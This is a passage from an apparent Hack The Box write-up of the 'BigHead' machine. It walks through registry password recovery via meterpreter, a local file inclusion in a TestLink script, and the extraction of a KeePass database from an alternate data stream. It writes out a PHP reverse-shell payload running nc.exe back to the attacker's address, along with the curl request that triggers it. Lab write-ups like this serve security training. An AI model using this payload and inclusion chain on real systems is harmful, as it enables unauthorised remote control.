<br><img src="/images/hackthebox/bighead/101.png" alt="" class="align-center"><br><br>
After a lot of enumeration I checked the <code class="language-plaintext highlighter-rouge">registry</code> and in <code class="language-plaintext highlighter-rouge">HKLM\System\CurrentControlSet\Services\</code> I found the <code class="language-plaintext highlighter-rouge">registry</code> for <code class="language-plaintext highlighter-rouge">nignx</code> (The web server) :
<code class="language-plaintext highlighter-rouge">reg enumkey -k 'HKLM\System\CurrentControlSet\Services\'</code>
<br><img src="/images/hackthebox/bighead/102.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bighead/103.png" alt="" class="align-center"><br><br>
Then I looked at the values and I found two interesting ones :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg enumkey -k 'HKLM\System\CurrentControlSet\Services\nginx
</code></pre></div></div>
<p><br><img src="/images/hackthebox/bighead/104.png" alt="" class="align-center"><br><br></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; reg enumkey -k 'HKLM\System\CurrentControlSet\Services\nginx'
Enumerating: HKLM\System\CurrentControlSet\Services\nginx

  Keys (2):

        Parameters
        Enum

  Values (12):

        Type
        Start
        ErrorControl
        ImagePath
        DisplayName
        ObjectName
        Description
        DelayedAutostart
        FailureActionsOnNonCrashFailures
        FailureActions
        Authenticate
        PasswordHash
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">Authenticate</code> and <code class="language-plaintext highlighter-rouge">PasswordHash</code>. Let’s look at the value :
<code class="language-plaintext highlighter-rouge">Authenticate</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg queryval -k 'HKLM\System\CurrentControlSet\Services\nginx' -v Authenticate
</code></pre></div></div>
<p><br><img src="/images/hackthebox/bighead/105.png" alt="" class="align-center"><br><br></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; reg queryval -k 'HKLM\System\CurrentControlSet\Services\nginx' -v Authenticate
Key: HKLM\System\CurrentControlSet\Services\nginx
Name: Authenticate
Type: REG_BINARY
Data: 4800370033004200700055005900320055007100390055002d005900750067007900740035004600590055006200590030002d0055003800370074003800370000000000
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">PasswordHash</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg queryval -k 'HKLM\System\CurrentControlSet\Services\nginx' -v PasswordHash
</code></pre></div></div>
<p><br><img src="/images/hackthebox/bighead/106.png" alt="" class="align-center"><br><br></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; reg queryval -k 'HKLM\System\CurrentControlSet\Services\nginx' -v PasswordHash
Key: HKLM\System\CurrentControlSet\Services\nginx
Name: PasswordHash
Type: REG_SZ
Data: 336d72676e6333205361797a205472794861726465722e2e2e203b440a
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">Authenticate</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>4800370033004200700055005900320055007100390055002d005900750067007900740035004600590055006200590030002d0055003800370074003800370000000000
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">PasswordHash</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>336d72676e6333205361797a205472794861726465722e2e2e203b440a
</code></pre></div></div>
<p>Looks like <code class="language-plaintext highlighter-rouge">hex</code>, Let’s see <code class="language-plaintext highlighter-rouge">Authenticate</code> : 
<br><img src="/images/hackthebox/bighead/107.png" alt="" class="align-center"><br><br>
The output was kinda weird, that’s because of the null bytes, I removed them then I got the right output :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>4837334270555932557139552d5975677974354659556259302d553837743837
</code></pre></div></div>
<p><br><img src="/images/hackthebox/bighead/108.png" alt="" class="align-center"><br><br>
So this might be a password : <code class="language-plaintext highlighter-rouge">H73BpUY2Uq9U-Yugyt5FYUbY0-U87t87</code>, Let’s check <code class="language-plaintext highlighter-rouge">PasswordHash</code> :
<br><img src="/images/hackthebox/bighead/109.png" alt="" class="align-center"><br><br>
<code class="language-plaintext highlighter-rouge">3mrgnc3 sayz TryHarder... ;D</code>, It was just a troll. Anyway we have a password let’s try to login to ssh as <code class="language-plaintext highlighter-rouge">nignx</code> :
<br><img src="/images/hackthebox/bighead/110.png" alt="" class="align-center"><br><br>
It worked, and by looking at the files I figured out that we are in <code class="language-plaintext highlighter-rouge">C:\xampp</code> :
<br><img src="/images/hackthebox/bighead/111.png" alt="" class="align-center"><br><br>
There was also a <code class="language-plaintext highlighter-rouge">user.txt</code>, I tried to read it but it said that it was a binary file :
<br><img src="/images/hackthebox/bighead/112.png" alt="" class="align-center"><br><br>
I wanted to check the user but <code class="language-plaintext highlighter-rouge">whoami</code> wasn’t there :
<br><img src="/images/hackthebox/bighead/113.png" alt="" class="align-center"><br><br>
So I checked <code class="language-plaintext highlighter-rouge">help</code> and this shell has only some basic commands :
<br><img src="/images/hackthebox/bighead/114.png" alt="" class="align-center"><br><br>
I know that I’m inside <code class="language-plaintext highlighter-rouge">C:\xampp</code> now. But what am I searching for anyway ? I went back to the <code class="language-plaintext highlighter-rouge">meterpreter</code> shell and checked the access log of <code class="language-plaintext highlighter-rouge">nginx</code> in <code class="language-plaintext highlighter-rouge">C:\nginx\logs</code> :
<br><img src="/images/hackthebox/bighead/115.png" alt="" class="align-center"><br><br>
At the beginning of the log I found some requests with the <code class="language-plaintext highlighter-rouge">user-agent</code> <code class="language-plaintext highlighter-rouge">3mrgnc3</code> :
<br><img src="/images/hackthebox/bighead/116.png" alt="" class="align-center"><br><br>
Most of them are HEAD requests, maybe he was testing the buffer overflow I don’t really know but anyway we are not looking for that. We are looking for requests to <code class="language-plaintext highlighter-rouge">/testlink</code>. Because everything we have access to on port 5080 is under <code class="language-plaintext highlighter-rouge">/testlink</code>.<br>
On the 7th of October 2018 at 02:17:16 and 02:18:06 I found two POST requests to <code class="language-plaintext highlighter-rouge">/testlink/linkto.php</code> :
<br><img src="/images/hackthebox/bighead/117.png" alt="" class="align-center"><br><br>
I went to that path and got an error which disclosed the path of the <code class="language-plaintext highlighter-rouge">php</code> file :
<br><img src="/images/hackthebox/bighead/118.png" alt="" class="align-center"><br><br></p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">Fatal</span> <span class="n">error</span><span class="o">:</span> <span class="k">require_once</span><span class="p">()</span><span class="o">:</span> <span class="nc">Failed</span> <span class="n">opening</span> <span class="n">required</span> <span class="s1">''</span> <span class="p">(</span><span class="n">include_path</span><span class="o">=</span><span class="err">'</span><span class="nc">C</span><span class="o">:</span><span class="err">\</span><span class="no">xampp\php\PEAR</span><span class="p">;</span><span class="mf">.</span><span class="p">;</span><span class="nc">C</span><span class="o">:</span><span class="err">\</span><span class="n">xampp\apps\testlink\htdocs\lib\functions</span><span class="err">\</span><span class="p">;</span><span class="nc">C</span><span class="o">:</span><span class="err">\</span><span class="n">xampp\apps\testlink\htdocs\lib\issuetrackerintegration</span><span class="err">\</span><span class="p">;</span><span class="nc">C</span><span class="o">:</span><span class="err">\</span><span class="n">xampp\apps\testlink\htdocs\lib\codetrackerintegration</span><span class="err">\</span><span class="p">;</span><span class="nc">C</span><span class="o">:</span><span class="err">\</span><span class="n">xampp\apps\testlink\htdocs\lib\reqmgrsystemintegration</span><span class="err">\</span><span class="p">;</span><span class="nc">C</span><span class="o">:</span><span class="err">\</span><span class="n">xampp\apps\testlink\htdocs\third_party</span><span class="err">\'</span><span class="p">)</span> <span class="n">in</span> <span class="nc">C</span><span class="o">:</span><span class="err">\</span><span class="n">xampp\apps\testlink\htdocs\linkto</span><span class="mf">.</span><span class="n">php</span> <span class="n">on</span> <span class="n">line</span> <span class="mi">62</span>
</code></pre></div></div>
<p>The path was <code class="language-plaintext highlighter-rouge">C:\xampp\apps\testlink\htdocs\linkto.php</code> So I went there and got the <code class="language-plaintext highlighter-rouge">php</code> file :
<br><img src="/images/hackthebox/bighead/119.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bighead/120.png" alt="" class="align-center"><br><br></p>

<h2 id="lfi-in-linktophp-user-flag">LFI in <code class="language-plaintext highlighter-rouge">linkto.php</code>, User Flag</h2>
<p>It’s a long script so I will just focus on the vulnerable part. First thing I noticed was this comment :
<br><img src="/images/hackthebox/bighead/121.png" alt="" class="align-center"><br><br>
So I checked <code class="language-plaintext highlighter-rouge">pipercoin.php</code> :
<br><img src="/images/hackthebox/bighead/122.png" alt="" class="align-center"><br><br>
<code class="language-plaintext highlighter-rouge">pipercoin.php</code> :</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!--                                                                                                                                        
TODO.. I just added a workaround to the linkto script for now.                                                                              
Nelson.                                                                                                                                     
--&gt;</span>                                                                                                                                         
<span class="cp">&lt;?php</span>                                                                                                                                       
<span class="k">echo</span><span class="p">(</span><span class="s1">'PiperCoinAuth'</span><span class="p">);</span>                                                                                                                      
<span class="cp">?&gt;</span>
</code></pre></div></div>
<p>Nothing interesting, Let’s go back to <code class="language-plaintext highlighter-rouge">linkto.php</code>
I noticed here that we can send a POST request with the parameters <code class="language-plaintext highlighter-rouge">PiperID</code> and <code class="language-plaintext highlighter-rouge">PiperCoinID</code> :</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'PiperID'</span><span class="p">])){</span><span class="nv">$PiperCoinAuth</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'PiperCoinID'</span><span class="p">];</span> <span class="c1">//plugins/ppiper/pipercoin.php                                         </span>
        <span class="nv">$PiperCoinSess</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$PiperCoinAuth</span><span class="p">);</span>                                                                                     
        <span class="nv">$PiperCoinAvitar</span> <span class="o">=</span> <span class="p">(</span><span class="n">string</span><span class="p">)</span><span class="nv">$PiperCoinSess</span><span class="p">;}</span>
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">PiperID</code> is not important but <code class="language-plaintext highlighter-rouge">PiperCoinID</code> is. It’s taking the value of <code class="language-plaintext highlighter-rouge">PiperCoinID</code> and assigning it to another variable called <code class="language-plaintext highlighter-rouge">$PiperCoinAuth</code>. After that it’s calling <a href="https://www.php.net/manual/en/function.require-once.php" target="_blank" rel="noopener noreferrer"><code class="language-plaintext highlighter-rouge">require_once()</code></a> with <code class="language-plaintext highlighter-rouge">$PiperCoinAuth</code>.<br>
<br><img src="/images/hackthebox/bighead/123.png" alt="" class="align-center"><br><br>
The vulnerability here is obvious. If we can control what’s in <code class="language-plaintext highlighter-rouge">require_once()</code> Then we can make it include any <code class="language-plaintext highlighter-rouge">php</code> file of our choice (Local File Inclusion).<br>
I created a simple <code class="language-plaintext highlighter-rouge">php</code> script to execute <code class="language-plaintext highlighter-rouge">nc.exe</code> and give me a reverse shell :
<br><img src="/images/hackthebox/bighead/124.png" alt="" class="align-center"><br><br></p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nb">system</span><span class="p">(</span><span class="s1">'C:\Users\Nelson\AppData\Local\Temp\nc.exe -e cmd.exe 10.10.xx.xx 1339'</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>
<p>I uploaded it and uploaded <code class="language-plaintext highlighter-rouge">nc.exe</code> to <code class="language-plaintext highlighter-rouge">C:\Users\Nelson\AppData\Local\Temp\</code> :
<br><img src="/images/hackthebox/bighead/125.png" alt="" class="align-center"><br><br>
 Last step is to exploit the vulnerability. We will send a POST request to :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://code.bighead.htb/testlink/linkto.php
</code></pre></div></div>
<p>With the parameters <code class="language-plaintext highlighter-rouge">PiperID</code> (we can leave it empty) and <code class="language-plaintext highlighter-rouge">PiperCoinID</code> which will be the path of the <code class="language-plaintext highlighter-rouge">php</code> script :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\Nelson\AppData\Local\Temp\rev.php
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -X POST "http://code.bighead.htb/testlink/linkto.php" -d "PiperID=&amp;PiperCoinID=C:\Users\Nelson\AppData\Local\Temp\rev.php"
</code></pre></div></div>
<p><br><img src="/images/hackthebox/bighead/126.png" alt="" class="align-center"><br><br>
We get a reverse shell immediately. As <code class="language-plaintext highlighter-rouge">nt authority\system</code> :
<br><img src="/images/hackthebox/bighead/127.png" alt="" class="align-center"><br><br>
Awesome now we can get root and user flags, right ? well … no. Let’s get the user flag first :
<br><img src="/images/hackthebox/bighead/128.png" alt="" class="align-center"><br><br>
We owned user !</p>

<h2 id="alternate-data-stream-in-roottxt">Alternate Data Stream in <code class="language-plaintext highlighter-rouge">root.txt</code>
</h2>
<p>Technically we own root now. But we still need to do some more stuff to get the root flag.<br>
I looked in <code class="language-plaintext highlighter-rouge">C:\Users\Administrator\Desktop</code> and the root flag wasn’t there.<br>
<br><img src="/images/hackthebox/bighead/129.png" alt="" class="align-center"><br><br>
I thought it might be hidden, so I tried to read it anyway and yes it was hidden. but …<br>
<br><img src="/images/hackthebox/bighead/130.png" alt="" class="align-center"><br><br>
Gilfoyle’s Prayer? Another “Silicon Valley” reference. I terminated the <code class="language-plaintext highlighter-rouge">meterpreter</code> session I had as <code class="language-plaintext highlighter-rouge">Nelson</code> then I went to <code class="language-plaintext highlighter-rouge">C:\Users\Nelson\AppData\Local\Temp</code> and executed <code class="language-plaintext highlighter-rouge">m.exe</code> to get another <code class="language-plaintext highlighter-rouge">meterpreter</code> session as <code class="language-plaintext highlighter-rouge">nt authority\system</code>. After that I uploaded <code class="language-plaintext highlighter-rouge">streams.exe</code> to check for alternate data streams on root.txt :
<br><img src="/images/hackthebox/bighead/131.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bighead/132.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bighead/133.png" alt="" class="align-center"><br><br>
<code class="language-plaintext highlighter-rouge">streams C:\Users\Administrator\Desktop\root.txt</code>
<br><img src="/images/hackthebox/bighead/134.png" alt="" class="align-center"><br><br>
There is an alternate stream called <code class="language-plaintext highlighter-rouge">Zone.Identifier</code>, I tried to read it but <code class="language-plaintext highlighter-rouge">type</code> and <code class="language-plaintext highlighter-rouge">more</code> didn’t work for some reason.<br>
<br><img src="/images/hackthebox/bighead/135.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bighead/136.png" alt="" class="align-center"><br><br>
After reading <a href="https://www.howtogeek.com/howto/windows-vista/stupid-geek-tricks-hide-data-in-a-secret-text-file-compartment/" target="_blank" rel="noopener noreferrer">this article</a> I did it like this :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>more &lt; "C:\Users\Administrator\Desktop\root.txt:Zone.Identifier"
</code></pre></div></div>
<p>And I saved the output to a file and named it <code class="language-plaintext highlighter-rouge">test</code>
<br><img src="/images/hackthebox/bighead/137.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bighead/138.png" alt="" class="align-center"><br><br>
When I looked at <code class="language-plaintext highlighter-rouge">test</code> I found that it was a binary file :
<br><img src="/images/hackthebox/bighead/139.png" alt="" class="align-center"><br><br>
So I downloaded it to use <code class="language-plaintext highlighter-rouge">file</code> against it :
<br><img src="/images/hackthebox/bighead/140.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bighead/141.png" alt="" class="align-center"><br><br>
Keepass password database</p>

<h2 id="cracking-the-database-root-flag">Cracking the Database, Root Flag</h2>
<blockquote>
  <p>KeePass Password Safe is a free and open-source password manager primarily for Windows. It officially supports macOS and Linux operating systems through the use of Mono. Additionally, there are several unofficial ports for Windows Phone, Android, iOS, and BlackBerry devices. -<a href="https://en.wikipedia.org/wiki/KeePass" target="_blank" rel="noopener noreferrer">Wikipedia</a></p>
</blockquote>

<p>I renamed the file to <code class="language-plaintext highlighter-rouge">test.kdbx</code> :
<br><img src="/images/hackthebox/bighead/142.png" alt="" class="align-center"><br><br>
Then I used <code class="language-plaintext highlighter-rouge">keepass2</code> to open it :
<br><img src="/images/hackthebox/bighead/143.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bighead/144.png" alt="" class="align-center"><br><br>
And of course we need a password and a key. I went back to the shell and checked the configuration file for <code class="language-plaintext highlighter-rouge">keepass</code> in :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\Administrator\AppData\Roaming\KeePass
</code></pre></div></div>
<p><br><img src="/images/hackthebox/bighead/145.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bighead/146.png" alt="" class="align-center"><br><br>
<code class="language-plaintext highlighter-rouge">KeePass.config.xml</code> :</p>
<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
<span class="nt">&lt;Configuration</span> <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="na">xmlns:xsd=</span><span class="s">"http://www.w3.org/2001/XMLSchema"</span><span class="nt">&gt;</span>
	<span class="nt">&lt;Meta&gt;</span>
		<span class="nt">&lt;PreferUserConfiguration&gt;</span>false<span class="nt">&lt;/PreferUserConfiguration&gt;</span>
		<span class="nt">&lt;OmitItemsWithDefaultValues&gt;</span>true<span class="nt">&lt;/OmitItemsWithDefaultValues&gt;</span>
		<span class="nt">&lt;DpiFactorX&gt;</span>1<span class="nt">&lt;/DpiFactorX&gt;</span>
		<span class="nt">&lt;DpiFactorY&gt;</span>1<span class="nt">&lt;/DpiFactorY&gt;</span>
	<span class="nt">&lt;/Meta&gt;</span>
	<span class="nt">&lt;Application&gt;</span>
		<span class="nt">&lt;LastUsedFile&gt;</span>
			<span class="nt">&lt;Path&gt;</span>..\..\Users\Administrator\Desktop\root.txt:Zone.Identifier<span class="nt">&lt;/Path&gt;</span>
			<span class="nt">&lt;CredProtMode&gt;</span>Obf<span class="nt">&lt;/CredProtMode&gt;</span>
			<span class="nt">&lt;CredSaveMode&gt;</span>NoSave<span class="nt">&lt;/CredSaveMode&gt;</span>
		<span class="nt">&lt;/LastUsedFile&gt;</span>
		<span class="nt">&lt;MostRecentlyUsed&gt;</span>
			<span class="nt">&lt;MaxItemCount&gt;</span>12<span class="nt">&lt;/MaxItemCount&gt;</span>
			<span class="nt">&lt;Items&gt;</span>
				<span class="nt">&lt;ConnectionInfo&gt;</span>
					<span class="nt">&lt;Path&gt;</span>..\..\Users\Administrator\Desktop\chest.kdbx<span class="nt">&lt;/Path&gt;</span>
					<span class="nt">&lt;CredProtMode&gt;</span>Obf<span class="nt">&lt;/CredProtMode&gt;</span>
					<span class="nt">&lt;CredSaveMode&gt;</span>NoSave<span class="nt">&lt;/CredSaveMode&gt;</span>
				<span class="nt">&lt;/ConnectionInfo&gt;</span>
			<span class="nt">&lt;/Items&gt;</span>
		<span class="nt">&lt;/MostRecentlyUsed&gt;</span>
		<span class="nt">&lt;WorkingDirectories&gt;</span>
			<span class="nt">&lt;Item&gt;</span>Database@..\..\Users\Administrator\Desktop<span class="nt">&lt;/Item&gt;</span>
			<span class="nt">&lt;Item&gt;</span>KeyFile@..\..\Users\Administrator\Desktop<span class="nt">&lt;/Item&gt;</span>
		<span class="nt">&lt;/WorkingDirectories&gt;</span>
		<span class="nt">&lt;Start&gt;</span>
			<span class="nt">&lt;CheckForUpdate&gt;</span>false<span class="nt">&lt;/CheckForUpdate&gt;</span>
			<span class="nt">&lt;CheckForUpdateConfigured&gt;</span>true<span class="nt">&lt;/CheckForUpdateConfigured&gt;</span>
		<span class="nt">&lt;/Start&gt;</span>
		<span class="nt">&lt;FileOpening</span> <span class="nt">/&gt;</span>
		<span class="nt">&lt;FileClosing</span> <span class="nt">/&gt;</span>
		<span class="nt">&lt;TriggerSystem&gt;</span>
			<span class="nt">&lt;Triggers</span> <span class="nt">/&gt;</span>
		<span class="nt">&lt;/TriggerSystem&gt;</span>
		<span class="nt">&lt;PluginCompatibility</span> <span class="nt">/&gt;</span>
	<span class="nt">&lt;/Application&gt;</span>
	<span class="nt">&lt;Logging</span> <span class="nt">/&gt;</span>
	<span class="nt">&lt;MainWindow&gt;</span>
		<span class="nt">&lt;X&gt;</span>2<span class="nt">&lt;/X&gt;</span>
		<span class="nt">&lt;Y&gt;</span>2<span class="nt">&lt;/Y&gt;</span>
		<span class="nt">&lt;Width&gt;</span>638<span class="nt">&lt;/Width&gt;</span>
		<span class="nt">&lt;Height&gt;</span>450<span class="nt">&lt;/Height&gt;</span>
		<span class="nt">&lt;SplitterHorizontalFrac&gt;</span>0.8333<span class="nt">&lt;/SplitterHorizontalFrac&gt;</span>
		<span class="nt">&lt;SplitterVerticalFrac&gt;</span>0.25<span class="nt">&lt;/SplitterVerticalFrac&gt;</span>
		<span class="nt">&lt;Layout&gt;</span>Default<span class="nt">&lt;/Layout&gt;</span>
		<span class="nt">&lt;ToolBar</span> <span class="nt">/&gt;</span>
		<span class="nt">&lt;EntryView</span> <span class="nt">/&gt;</span>
		<span class="nt">&lt;TanView</span> <span class="nt">/&gt;</span>
		<span class="nt">&lt;EntryListColumnCollection&gt;</span>
			<span class="nt">&lt;Column&gt;</span>
				<span class="nt">&lt;Type&gt;</span>Title<span class="nt">&lt;/Type&gt;</span>
				<span class="nt">&lt;Width&gt;</span>90<span class="nt">&lt;/Width&gt;</span>
			<span class="nt">&lt;/Column&gt;</span>
			<span class="nt">&lt;Column&gt;</span>
				<span class="nt">&lt;Type&gt;</span>UserName<span class="nt">&lt;/Type&gt;</span>
				<span class="nt">&lt;Width&gt;</span>90<span class="nt">&lt;/Width&gt;</span>
			<span class="nt">&lt;/Column&gt;</span>
			<span class="nt">&lt;Column&gt;</span>
				<span class="nt">&lt;Type&gt;</span>Password<span class="nt">&lt;/Type&gt;</span>
				<span class="nt">&lt;Width&gt;</span>90<span class="nt">&lt;/Width&gt;</span>
				<span class="nt">&lt;HideWithAsterisks&gt;</span>true<span class="nt">&lt;/HideWithAsterisks&gt;</span>
			<span class="nt">&lt;/Column&gt;</span>
			<span class="nt">&lt;Column&gt;</span>
				<span class="nt">&lt;Type&gt;</span>Url<span class="nt">&lt;/Type&gt;</span>
				<span class="nt">&lt;Width&gt;</span>90<span class="nt">&lt;/Width&gt;</span>
			<span class="nt">&lt;/Column&gt;</span>
			<span class="nt">&lt;Column&gt;</span>
				<span class="nt">&lt;Type&gt;</span>Notes<span class="nt">&lt;/Type&gt;</span>
				<span class="nt">&lt;Width&gt;</span>90<span class="nt">&lt;/Width&gt;</span>
			<span class="nt">&lt;/Column&gt;</span>
		<span class="nt">&lt;/EntryListColumnCollection&gt;</span>
		<span class="nt">&lt;EntryListColumnDisplayOrder&gt;</span>0 1 2 3 4<span class="nt">&lt;/EntryListColumnDisplayOrder&gt;</span>
		<span class="nt">&lt;ListSorting&gt;</span>
			<span class="nt">&lt;Order&gt;</span>Ascending<span class="nt">&lt;/Order&gt;</span>
		<span class="nt">&lt;/ListSorting&gt;</span>
	<span class="nt">&lt;/MainWindow&gt;</span>
	<span class="nt">&lt;UI&gt;</span>
		<span class="nt">&lt;TrayIcon</span> <span class="nt">/&gt;</span>
		<span class="nt">&lt;Hiding</span> <span class="nt">/&gt;</span>
		<span class="nt">&lt;StandardFont&gt;</span>
			<span class="nt">&lt;Family&gt;</span>Microsoft Sans Serif<span class="nt">&lt;/Family&gt;</span>
			<span class="nt">&lt;Size&gt;</span>8.25<span class="nt">&lt;/Size&gt;</span>
			<span class="nt">&lt;GraphicsUnit&gt;</span>Point<span class="nt">&lt;/GraphicsUnit&gt;</span>
			<span class="nt">&lt;Style&gt;</span>Regular<span class="nt">&lt;/Style&gt;</span>
			<span class="nt">&lt;OverrideUIDefault&gt;</span>false<span class="nt">&lt;/OverrideUIDefault&gt;</span>
		<span class="nt">&lt;/StandardFont&gt;</span>
		<span class="nt">&lt;PasswordFont&gt;</span>
			<span class="nt">&lt;Family&gt;</span>Courier New<span class="nt">&lt;/Family&gt;</span>
			<span class="nt">&lt;Size&gt;</span>8.25<span class="nt">&lt;/Size&gt;</span>
			<span class="nt">&lt;GraphicsUnit&gt;</span>Point<span class="nt">&lt;/GraphicsUnit&gt;</span>
			<span class="nt">&lt;Style&gt;</span>Regular<span class="nt">&lt;/Style&gt;</span>
			<span class="nt">&lt;OverrideUIDefault&gt;</span>false<span class="nt">&lt;/OverrideUIDefault&gt;</span>
		<span class="nt">&lt;/PasswordFont&gt;</span>
		<span class="nt">&lt;BannerStyle&gt;</span>WinVistaBlack<span class="nt">&lt;/BannerStyle&gt;</span>
		<span class="nt">&lt;DataEditorFont&gt;</span>
			<span class="nt">&lt;Family&gt;</span>Microsoft Sans Serif<span class="nt">&lt;/Family&gt;</span>
			<span class="nt">&lt;Size&gt;</span>8.25<span class="nt">&lt;/Size&gt;</span>
			<span class="nt">&lt;GraphicsUnit&gt;</span>Point<span class="nt">&lt;/GraphicsUnit&gt;</span>
			<span class="nt">&lt;Style&gt;</span>Regular<span class="nt">&lt;/Style&gt;</span>
			<span class="nt">&lt;OverrideUIDefault&gt;</span>false<span class="nt">&lt;/OverrideUIDefault&gt;</span>
		<span class="nt">&lt;/DataEditorFont&gt;</span>
		<span class="nt">&lt;UIFlags&gt;</span>0<span class="nt">&lt;/UIFlags&gt;</span>
		<span class="nt">&lt;KeyCreationFlags&gt;</span>0<span class="nt">&lt;/KeyCreationFlags&gt;</span>
		<span class="nt">&lt;KeyPromptFlags&gt;</span>0<span class="nt">&lt;/KeyPromptFlags&gt;</span>
	<span class="nt">&lt;/UI&gt;</span>
	<span class="nt">&lt;Security&gt;</span>
		<span class="nt">&lt;WorkspaceLocking&gt;</span>
			<span class="nt">&lt;LockAfterTime&gt;</span>0<span class="nt">&lt;/LockAfterTime&gt;</span>
			<span class="nt">&lt;LockAfterGlobalTime&gt;</span>0<span class="nt">&lt;/LockAfterGlobalTime&gt;</span>
		<span class="nt">&lt;/WorkspaceLocking&gt;</span>
		<span class="nt">&lt;Policy</span> <span class="nt">/&gt;</span>
		<span class="nt">&lt;MasterPassword&gt;</span>
			<span class="nt">&lt;MinimumLength&gt;</span>0<span class="nt">&lt;/MinimumLength&gt;</span>
			<span class="nt">&lt;MinimumQuality&gt;</span>0<span class="nt">&lt;/MinimumQuality&gt;</span>
		<span class="nt">&lt;/MasterPassword&gt;</span>
	<span class="nt">&lt;/Security&gt;</span>
	<span class="nt">&lt;Native</span> <span class="nt">/&gt;</span>
	<span class="nt">&lt;PasswordGenerator&gt;</span>
		<span class="nt">&lt;AutoGeneratedPasswordsProfile&gt;</span>
			<span class="nt">&lt;GeneratorType&gt;</span>CharSet<span class="nt">&lt;/GeneratorType&gt;</span>
			<span class="nt">&lt;Length&gt;</span>20<span class="nt">&lt;/Length&gt;</span>
			<span class="nt">&lt;CharSetRanges&gt;</span>ULD_______<span class="nt">&lt;/CharSetRanges&gt;</span>
		<span class="nt">&lt;/AutoGeneratedPasswordsProfile&gt;</span>
		<span class="nt">&lt;LastUsedProfile&gt;</span>
			<span class="nt">&lt;GeneratorType&gt;</span>CharSet<span class="nt">&lt;/GeneratorType&gt;</span>
			<span class="nt">&lt;Length&gt;</span>20<span class="nt">&lt;/Length&gt;</span>
			<span class="nt">&lt;CharSetRanges&gt;</span>ULD_______<span class="nt">&lt;/CharSetRanges&gt;</span>
		<span class="nt">&lt;/LastUsedProfile&gt;</span>
		<span class="nt">&lt;UserProfiles</span> <span class="nt">/&gt;</span>
	<span class="nt">&lt;/PasswordGenerator&gt;</span>
	<span class="nt">&lt;Defaults&gt;</span>
		<span class="nt">&lt;OptionsTabIndex&gt;</span>0<span class="nt">&lt;/OptionsTabIndex&gt;</span>
		<span class="nt">&lt;SearchParameters&gt;</span>
			<span class="nt">&lt;ComparisonMode&gt;</span>InvariantCultureIgnoreCase<span class="nt">&lt;/ComparisonMode&gt;</span>
		<span class="nt">&lt;/SearchParameters&gt;</span>
		<span class="nt">&lt;KeySources&gt;</span>
			<span class="nt">&lt;Association&gt;</span>
				<span class="nt">&lt;DatabasePath&gt;</span>..\..\Users\Administrator\Desktop\root.txt:Zone.Identifier<span class="nt">&lt;/DatabasePath&gt;</span>
				<span class="nt">&lt;Password&gt;</span>true<span class="nt">&lt;/Password&gt;</span>
				<span class="nt">&lt;KeyFilePath&gt;</span>..\..\Users\Administrator\Pictures\admin.png<span class="nt">&lt;/KeyFilePath&gt;</span>
			<span class="nt">&lt;/Association&gt;</span>
		<span class="nt">&lt;/KeySources&gt;</span>
	<span class="nt">&lt;/Defaults&gt;</span>
	<span class="nt">&lt;Integration&gt;</span>
		<span class="nt">&lt;HotKeyGlobalAutoType&gt;</span>393281<span class="nt">&lt;/HotKeyGlobalAutoType:&gt;</span>
		<span class="nt">&lt;HotKeySelectedAutoType&gt;</span>0<span class="nt">&lt;/HotKeySelectedAutoType&gt;</span>
		<span class="nt">&lt;HotKeyShowWindow&gt;</span>393291<span class="nt">&lt;/HotKeyShowWindow&gt;</span>
		<span class="nt">&lt;HotKeyEntryMenu&gt;</span>0<span class="nt">&lt;/HotKeyEntryMenu&gt;</span>
		<span class="nt">&lt;UrlSchemeOverrides&gt;</span>
			<span class="nt">&lt;BuiltInOverridesEnabled&gt;</span>1<span class="nt">&lt;/BuiltInOverridesEnabled&gt;</span>
